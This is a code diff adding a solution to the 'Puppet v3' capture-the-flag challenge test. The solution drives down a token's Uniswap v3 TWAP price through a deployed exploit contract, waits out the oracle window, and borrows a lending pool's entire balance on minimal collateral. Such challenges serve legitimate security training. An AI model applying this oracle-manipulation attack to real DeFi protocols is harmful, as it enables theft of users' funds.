@@ -87,6 +87,8 @@ describe('[Challenge] Puppet v3', function () {
             token.address,
             FEE
         );
+
+        console.log("Uniswap pool address: " + uniswapPoolAddress);
         uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
         await uniswapPool.increaseObservationCardinalityNext(40);
         
@@ -105,7 +107,7 @@ describe('[Challenge] Puppet v3', function () {
             amount0Min: 0,
             amount1Min: 0,
             deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
-        }, { gasLimit: 5000000 });        
+        }, { gasLimit: 5000000 });
 
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
@@ -139,7 +141,40 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+        const FEE = 3000; // 0.3%
+        // The main net was forked, resulting in plenty of tokenIds already existing
+        playerPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, player);
+        playerLender = await lendingPool.connect(player);
+        playerToken = await token.connect(player);
+        playerWeth = await weth.connect(player);
+        Exploit = await (await ethers.getContractFactory('ExploitPuppetV3', deployer)).deploy(uniswapPool.address, player.address, weth.address, token.address);
+
+        await playerToken.approve(Exploit.address, ethers.constants.MaxUint256);
+
+        // 1.0001**60 = 1.0060177342688175 which means that if the price goes beyond this the liquidity will be null
+        // Might need to provide some liquidity at that range if it's 0 and the pool stops working
+
+        result = await playerLender.calculateDepositOfWETHRequired(1) / 3;
+        console.log("Price: " + BigInt(result));
+
+        // Set a high price limit since we want to tank the price of DVT
+        await Exploit.exploit(PLAYER_INITIAL_TOKEN_BALANCE, encodePriceSqrt(1n,10n**35n));
+
+        // Wait the TWAP interval to maximize the shift in price due to denominator of formula
+        await time.increase(100); // time in seconds
+        result = await playerLender.calculateDepositOfWETHRequired(1) / 3;
+        console.log("Price: " + BigInt(result));
+
+        result = await playerLender.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Collateral needed: " + BigInt(result) / 10n ** 18n);
+
+        console.log("WETH owned by player: " + BigInt(await weth.balanceOf(player.address)) / 10n ** 18n)
+
+        await playerWeth.approve(playerLender.address, ethers.constants.MaxUint256);
+        await playerLender.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log("DVT owned by lender: " + BigInt(await token.balanceOf(playerLender.address)) / 10n ** 18n)
     });
 
     after(async function () {
